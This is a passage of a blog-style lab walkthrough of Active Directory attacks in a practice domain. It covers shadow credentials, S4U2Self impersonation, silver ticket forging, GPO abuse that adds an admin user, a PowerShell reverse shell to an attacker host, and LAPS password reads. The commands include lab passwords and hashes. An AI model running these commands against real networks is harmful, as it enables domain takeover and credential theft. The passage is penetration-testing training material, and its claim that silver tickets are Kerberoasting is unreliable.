+    </code>certipy shadow auto -u 'stannis.baratheon@sevenkingdoms.local' -p 'MrStark123' -account 'kingslanding$'<code>
+    
+    <img src="images/image-303.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    'KINGSLANDING$': 7147e7ee3e5cf640e32995d1610a41bb
+    
+    Now we hold <strong>KINGSLANDING$</strong> TGT and NT hash as well.
+    From this point, we know that <strong>KINGSLANDING$</strong> is the Domain Controller of <strong>sevenkingdoms.local</strong> domain, we can do several things here like a DCSync attack straightforward.
+    
+    For labbing purpose, let’s try something different…
+    
+    ## <strong>Machine account to Administrator shell</strong>
+    
+    We can try S4u2Self abuse and create a silver ticket as well.
+    
+    ### <strong>s4u2self abuse</strong>
+    
+    For this attack, we can ask for the Adminstrator’s TGS(Ticket Granting Service) as the administrator domains user.
+    
+    For that we will use <strong>kingslanding$</strong> machine TGT (Ticket Granting Ticket).
+    
+    </code>export KRB5CCNAME=kingslanding.ccache<code>
+    
+    <a href="http://getst.py/" target="_blank"></code>getST.py</a> -self -impersonate 'Administrator' -altservice 'CIFS/kingslanding.sevenkingdoms.local' -k -no-pass -dc-ip 10.4.10.10 'sevenkingdoms.local'/'kingslanding$'<code>
+    
+    <img src="images/image-304.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    As we can see above we were able to impersonate the Administrator and get it’s Administrator’s TGS. We can now use  it’s TGS to login into the Domain Controller as Domain Admin. 
+    
+    </code>export KRB5CCNAME=Administrator@CIFS_kingslanding.sevenkingdoms.local@SEVENKINGDOMS.LOCAL.ccache<code>
+    
+    <a href="http://wmiexec.py/" target="_blank"></code>wmiexec.py</a> -k -no-pass sevenkingdoms.local/Administrator@kingslanding.sevenkingdoms.local<code>
+    
+    <img src="images/image-305.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    ## <strong>Silver ticket - To be Finished.</strong>
+    
+    The second option we have to get Domain Admin holding Kingslanding$ TGT, is to get a Silver Ticket.
+    A <strong>silver ticket</strong> is a forged authentication ticket often created when an attacker steals an account password. What a silver ticket attack shares with other types of ticket attacks is the abuse of the Kerberos vulnerability.  This is called Kerberoasting, and it harvests password hashes for  Microsoft Active Directory user accounts by exploiting Kerberos, a  network security protocol that authenticates service requests using secret-key cryptography.
+    
+    To execute a silver ticket attack, an attacker needs to already have control of a compromised target in the system.
+    Once the attacker has a way in, a silver ticket attack follows a step-by-step process to forge authorization credentials.
+    
+    <strong>Step 1. Gather information about the domain and the targeted local service.</strong> This involves discovering the domain security identifier and the DNS name of the service the attack is intended for.
+    <a href="http://lookupsid.py/" target="_blank"></code>lookupsid.py</a> 'sevenkingdoms.local'/'kingslanding$'@'kingslanding.sevenkingdoms.local' 0 -hashes ':7147e7ee3e5cf640e32995d1610a41bb'<code>
+    
+    <img src="images/image-306.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    <strong>Step 2. We now create the Silver Ticket.</strong>.
+    
+    <a href="http://ticketer.py/" target="_blank"></code>ticketer.py</a> -domain-sid 'S-1-5-21-332544030-1053405351-3017451513' -domain 'sevenkingdoms.local' -spn 'CIFS/kingslanding.sevenkingdoms.local' -nthash ':7147e7ee3e5cf640e32995d1610a41bb' Administrator<code>
+    
+    <img src="images/image-307.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    <strong>Step 3. Use the forged tickets for financial gain or to further corrupt a system,</strong> depending on the attacker’s objective.
+    
+    # <strong>GPO abuse</strong>
+    
+    Group Policy Objects are a collection of settings that can be applied to groups of computers or users within a Windows domain. These settings can govern various configurations, including security policies, software installation, and network drive mappings. GPOs are stored on a domain controller and are applied to targeted objects during the login process.
+    
+    However, in the wrong hands, GPOs can become a potent weapon for attackers. In this lab, we will explore the concept of GPO abuse and how it can be harnessed to gain unauthorized access and control over a network.
+    
+    > Please be aware that abusing GPOs can mess with the internal policies in an Active Directory enviroment, we need to be careful when abusing these GPOs permissions.
+    > 
+    
+    We can identify weak GPOs policy using Bloodhound. Here is the command:
+    
+    </code>bloodhound-python -c all -u 'samwell.tarly@north.sevenkingdoms.local' -p 'Heartsbane' -ns 10.4.10.11 -d north.sevenkingdoms.local -dc winterfell.north.sevenkingdoms.local<code>
+    
+    After getting the information, we need to upload it to bloodhound and if we use the proper filter we get all <strong>ACL/ACE</strong> and <strong>GPOs</strong> configuration.
+    
+    </code>MATCH p=(u)-[r1]->(n) WHERE r1.isacl=true and not tolower(u.name) contains 'vagrant' and u.admincount=false and not tolower(u.name) contains 'key' RETURN p<code>
+    
+    <img src="images/image-308.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    Above screenshot we see that user <strong>Samwell.Tarly</strong> has <strong></code>WriteDACL<code></strong>/<strong></code>WriteOwner<code></strong>/<strong></code>GenericWrite<code></strong> rights over Group Policy Object <strong>StarkWallpaper.</strong>
+    
+    For this abuse we will be using <a href="https://github.com/Hackndo/pyGPOAbuse" target="_blank">pyGPOAbuse</a> which is a Unix-Like option.
+    
+    GPO-ID can be found using <a href="http://GPOwned.py" target="_blank">GPOwned.py</a> with the following command:
+    
+    </code>python3 <a href="https://github.com/X-C3LL/GPOwned" target="_blank">GPOwned.py</a> -u 'samwell.tarly' -p 'Heartsbane' -d north.sevenkingdoms.local -dc-ip 10.4.10.11 -gpcmachine -listgpo<code>
+    
+    <img src="images/image-309.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    It’s also possible to get GPO-ID from Bloodhound as well.
+    
+    <img src="images/image-310.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    <strong>GPO-ID: 04D1C282-2F79-452A-AAED-8B9FC51957AB</strong>
+    
+    The standard action for this script, will create an <strong>immediate scheduled task</strong> as <strong>SYSTEM</strong> on the remote computer for computer GPO, or as logged in user for user GPO.
+    If we check pygpoabuse.py, you will notice that the default command is to add user <strong></code>John<code></strong> with the password <strong></code>H4x00r123..<code></strong> and the user will also be added to the local <strong>Administrator</strong> group.
+    
+    <img src="images/image-311.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    So lets’s execute the command:
+    </code>python3 <a href="http://pygpoabuse.py/" target="_blank">pygpoabuse.py</a> north.sevenkingdoms.local/samwell.tarly:'Heartsbane' -gpo-id "04D1C282-2F79-452A-AAED-8B9FC51957AB"<code>
+    
+    <img src="images/image-312.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    above see that, the new task was created with success, we were able to abuse the rights we do have on this GPO.
+    Now it’s just matter of time, we just need to way for few minutes and we will be avble to login as user <strong>John</strong>.
+    
+    </code>evil-winrm -u 'john' -p 'H4x00r123..' -i 10.4.10.11<code>
+    
+    <img src="images/image-313.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    Reverse Shell
+    
+    A reverse shell can also be achieved from the following command:
+    </code>python3 <a href="http://pygpoabuse.py/" target="_blank">pygpoabuse.py</a> north.sevenkingdoms.local/samwell.tarly:'Heartsbane' -gpo-id "04D1C282-2F79-452A-AAED-8B9FC51957AB" -powershell -command "\$c = New-Object System.Net.Sockets.TCPClient('10.4.10.1',443);\$s = \$c.GetStream();[byte[]]\$b = 0..65535|%{0};while((\$i = \$s.Read(\$b, 0, \$b.Length)) -ne 0){ \$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0, \$i); \$sb = (iex \$d 2>&1 | Out-String ); \$sb = ([text.encoding]::ASCII).GetBytes(\$sb + 'ps> '); \$s.Write(\$sb,0,\$sb.Length); \$s.Flush()};\$c.Close()" -taskname "MrStarkTask" -description "It's Tony Stark Here"<code>
+    
+    after few minutes we get the connection to the server.
+    
+    <img src="images/image-314.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    # <strong>Read Laps password</strong>
+    
+    Local Administrator Password Solution (LAPS) is a tool used for managing a system where <strong>administrator passwords</strong>, which are <strong>unique, randomized, and frequently changed</strong>, are applied to domain-joined computers. These passwords are stored securely within Active Directory and are only accessible to users who have been granted permission through Access Control Lists (ACLs). The security of the password transmissions from the client to the server is ensured by the use of <strong>Kerberos version 5</strong> and <strong>Advanced Encryption Standard (AES)</strong>.
+    
+    In the domain's computer objects, the implementation of LAPS results in the addition of two new attributes: <strong></code>ms-mcs-AdmPwd<code></strong> and <strong></code>ms-mcs-AdmPwdExpirationTime<code>.</strong>
+    These attributes store the <strong>plain-text administrator password</strong> and <strong>its expiration time</strong>, respectively.
+    
+    This abuse can be carried out when controlling an object that has </code>GenericAll<code> or </code>AllExtendedRights<code> (or combination of </code>GetChanges<code> and (</code>GetChangesInFilteredSet<code> or </code>GetChangesAll<code>) for domain-wise synchronization) over the target computer configured for LAPS. 
+    The attacker can then read the LAPS password of the computer account (i.e. the password of the computer's local administrator).
+    
+    We can see below that user <strong>Jorah.Mormont</strong> has <strong></code>ReadLAPSPassword<code></strong> right over <strong>Braavos.essos.local</strong>, which is the essos.local domain controller.
+    
+    <img src="images/image-315.png" alt="acl_read_laps.png" class="article-image" loading="lazy">
+    
+    We do have 2 options for this type of abuse. from boht examples we are able to retrive the computers password if not configured properly.
+    
+    ### PyLAPS
+    
+    </code>python3 <a href="http://pylaps.py/" target="_blank">pyLAPS.py</a> --action get -d 'essos.local' -u 'jorah.mormont' -p 'H0nnor!' --dc-ip 10.4.10.11<code>
+    
+    <img src="images/image-316.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    ### NetExec
+    
+    </code>netexec ldap 10.4.10.12 -d essos.local -u jorah.mormont -p 'H0nnor!' --module laps<code>
+    
+    <img src="images/image-317.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    <strong></code>BRAAVOS$ : 12([2r3;m-o80Z`</strong>
+        </section>
+      </article>
+    </div>
+  </main>
+
+  <script src="../assets/js/script.js"></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+</body>
+</html>
